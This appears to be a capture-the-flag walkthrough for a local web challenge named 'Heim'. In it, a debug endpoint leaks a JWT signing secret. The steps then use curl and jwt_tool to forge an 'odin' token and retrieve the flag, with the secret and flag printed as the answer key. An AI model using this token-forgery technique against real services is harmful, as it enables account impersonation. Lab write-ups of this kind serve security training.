# Heim

![Longhouse](./../app/static/Longhouse.jpg)

## Walkthrough

1. Navigate to `localhost:8080` and a home page with a form will be presented
2. Fill in a name and click submit or make a POST request to `/auth` with `x-www-form-urlencoded` body data that includes a `username` parameter with a value of your choosing. As you do so, open the dev console of your browser and sniff the network traffic. After authorization, you should see Heim making a GET request to `/auth`, leaking `jwt_secret_key` in its query parameters.

```bash
curl --location --request POST 'localhost:8080/auth' \
--header 'Content-Type: application/x-www-form-urlencoded' \
--data-urlencode 'username=<redacted_username>'
```

3. Save the provided `access_key` and leaked `jwt_secret_key`

```json
{
    "access_token": "<redacted_access_token>"
}
```

![network_dump](./network_dump.png)

4. Make a GET request to `localhost:8080`, passing the retrieved `access_key` as a BEARER token for authorization

```bash
curl --location --request GET 'localhost:8080' \
--header 'Authorization: Bearer <redacted_access_token>'
```

5. You will be redirected to `/heim` and will receive a JSON encoded response with a `msg` attribute that contains a base64 encoded blob

```
{
    "msg": "ewogICAgImFwaSI6IHsKICAgICAgICAidjEiOiB7CiAgICAgICAgICAgICIvYXV0aCI6IHsKICAgICAgICAgICAgICAgICJnZXQiOiB7CiAgICAgICAgICAgICAgICAgICAgInN1bW1hcnkiOiAiRGVidWdnaW5nIG1ldGhvZCBmb3IgYXV0aG9yaXphdGlvbiBwb3N0IiwKICAgICAgICAgICAgICAgICAgICAic2VjdXJpdHkiOiAiTm9uZSIsCiAgICAgICAgICAgICAgICAgICAgInBhcmFtZXRlcnMiOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICJhY2Nlc3NfdG9rZW4iOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAicmVxdWlyZWQiOiB0cnVlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogIkFjY2VzcyB0b2tlbiBmcm9tIHJlY2VudGx5IGF1dGhvcml6ZWQgVmlraW5nIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJpbiI6ICJwYXRoIiwKICAgICAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAgICAgImp3dF9zZWNyZXRfa2V5IjogewogICAgICAgICAgICAgICAgICAgICAgICAgICAgInJlcXVpcmVkIjogZmFsc2UsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZGVzY3JpcHRpb24iOiAiRGVidWdnaW5nIC0gc2hvdWxkIGJlIHJlbW92ZWQgaW4gcHJvZCBIZWltIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJpbiI6ICJwYXRoIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICJwb3N0IjogewogICAgICAgICAgICAgICAgICAgICJzdW1tYXJ5IjogIkF1dGhvcml6ZSB5b3Vyc2VsZiBhcyBhIFZpa2luZyIsCiAgICAgICAgICAgICAgICAgICAgInNlY3VyaXR5IjogIk5vbmUiLAogICAgICAgICAgICAgICAgICAgICJwYXJhbWV0ZXJzIjogewogICAgICAgICAgICAgICAgICAgICAgICAidXNlcm5hbWUiOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAicmVxdWlyZWQiOiB0cnVlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogIllvdXIgVmlraW5nIG5hbWUiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImluIjogImJvZHkiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImNvbnRlbnQiOiAibXVsdGlwYXJ0L3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSwKICAgICAgICAgICAgIi9oZWltIjogewogICAgICAgICAgICAgICAgImdldCI6IHsKICAgICAgICAgICAgICAgICAgICAic3VtbWFyeSI6ICJMaXN0IHRoZSBlbmRwb2ludHMgYXZhaWxhYmxlIHRvIG5hbWVkIFZpa2luZ3MiLAogICAgICAgICAgICAgICAgICAgICJzZWN1cml0eSI6ICJCZWFyZXJBdXRoIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9LAogICAgICAgICAgICAiL2ZsYWciOiB7CiAgICAgICAgICAgICAgICAiZ2V0IjogewogICAgICAgICAgICAgICAgICAgICJzdW1tYXJ5IjogIlJldHJpZXZlIHRoZSBmbGFnIiwKICAgICAgICAgICAgICAgICAgICAic2VjdXJpdHkiOiAiQmVhcmVyQXV0aCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQ=="
}
```

```json
{
    "api": {
        "v1": {
            "/auth": {
                "get": {
                    "summary": "Debugging method for authorization post",
                    "security": "None",
                    "parameters": {
                        "access_token": {
                            "required": true,
                            "description": "Access token from recently authorized Viking",
                            "in": "path",
                        },
                        "jwt_secret_key": {
                            "required": false,
                            "description": "Debugging - should be removed in prod Heim",
                            "in": "path"
                        }
                    }
                },
                "post": {
                    "summary": "Authorize yourself as a Viking",
                    "security": "None",
                    "parameters": {
                        "username": {
                            "required": true,
                            "description": "Your Viking name",
                            "in": "body",
                            "content": "multipart/x-www-form-urlencoded"
                        }
                    }
                }
            },
            "/heim": {
                "get": {
                    "summary": "List the endpoints available to named Vikings",
                    "security": "BearerAuth"
                }
            },
            "/flag": {
                "get": {
                    "summary": "Retrieve the flag",
                    "security": "BearerAuth"
                }
            }
        }
    }
}
```

6. Decode the base64 encoded `msg` blob and it is revealed as a basic API schema. A useful tool for this is [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=ZXdvZ0lDQWdJbUZ3YVNJNklIc0tJQ0FnSUNBZ0lDQWlkakVpT2lCN0NpQWdJQ0FnSUNBZ0lDQWdJQ0l2WVhWMGFDSTZJSHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0p3YjNOMElqb2dld29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNKemRXMXRZWEo1SWpvZ0lrRjFkR2h2Y21sNlpTQjViM1Z5YzJWc1ppQmhjeUJoSUZacGEybHVaeUlzQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0luTmxZM1Z5YVhSNUlqb2dJazV2Ym1VaUxBb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0p3WVhKaGJXVjBaWEp6SWpvZ2V3b2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBaWJtRnRaU0k2SUNKMWMyVnlibUZ0WlNJc0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNKeVpYRjFhWEpsWkNJNklIUnlkV1VzQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0prWlhOamNtbHdkR2x2YmlJNklDSlpiM1Z5SUZacGEybHVaeUJ1WVcxbElpd0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0ltbHVJam9nSW1KdlpIa2lMQW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWlZMjl1ZEdWdWRDSTZJQ0p0ZFd4MGFYQmhjblF2ZUMxM2QzY3RabTl5YlMxMWNteGxibU52WkdWa0lnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSDBLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSDBLSUNBZ0lDQWdJQ0FnSUNBZ2ZTd0tJQ0FnSUNBZ0lDQWdJQ0FnSWk5b1pXbHRJam9nZXdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSW1kbGRDSTZJSHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBaWMzVnRiV0Z5ZVNJNklDSk1hWE4wSUhSb1pTQmxibVJ3YjJsdWRITWdZWFpoYVd4aFlteGxJSFJ2SUc1aGJXVmtJRlpwYTJsdVozTWlMQW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNKelpXTjFjbWwwZVNJNklDSkNaV0Z5WlhKQmRYUm9JZ29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdmUW9nSUNBZ0lDQWdJQ0FnSUNCOUxBb2dJQ0FnSUNBZ0lDQWdJQ0FpTDJac1lXY2lPaUI3Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FpWjJWMElqb2dld29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNKemRXMXRZWEo1SWpvZ0lsSmxkSEpwWlhabElIUm9aU0JtYkdGbklpd0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FpYzJWamRYSnBkSGtpT2lBaVFtVmhjbVZ5UVhWMGFDSUtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lIMEtJQ0FnSUNBZ0lDQWdJQ0FnZlFvZ0lDQWdJQ0FnSUgwS0lDQWdJSDBLZlE9PQ)
7. Make a GET request to `/flag`, passing your `access_token` as a BEARER token for authorization and you will receive an error indicating only the AllFather is worthy of receving the flag

```bash
curl --location --request GET 'localhost:8080/flag' \
--header 'Authorization: Bearer <redacted_access_token>'
```

```json
{
    "msg": "You are not worthy. Only the AllFather may view the flag"
}
```

8. If you now go back to step 2 and try to perform this step with the username `odin` you will receive an error

```bash
curl --location --request POST 'localhost:8080/auth' \
--header 'Content-Type: application/x-www-form-urlencoded' \
--data-urlencode 'username=odin'
```

```json
{
    "error": "You are not wise enough to be Odin"
}
```

9. Instead, you should tamper with your current `access_token`. Heim was misconfigured and provided us with the `jwt_secret_key`, which we can use to forge entirely new keys or tamper with existing ones. A helpful tool for this is the [JSON Web Token Toolkit v2](https://github.com/ticarpi/jwt_tool/blob/master/jwt_tool.py)
10. Change the `sub` value in your `access_token` to `odin` and sign the tampered key with the `hs256` algorithm, passing the saved `jwt_secret_key` as the signing key

```bash
python3 jwt_tool.py -S hs256 -p arottenbranchwillbefoundineverytree <redacted_access_token> -T
```

![jwt_tool_1](./jwt_tool_1.png)
![jwt_tool_2](./jwt_tool_2.png)

11. Make another GET request to `/flag`, passing your new `access_token` identifying you as `odin` and you will receive the flag

```bash
curl --location --request GET 'localhost:8080/flag' \
--header 'Authorization: Bearer <redacted_tampered_access_token>'
```

```json
{
    "flag": "flag{liveheim_laughheim_loveheim}"
}
```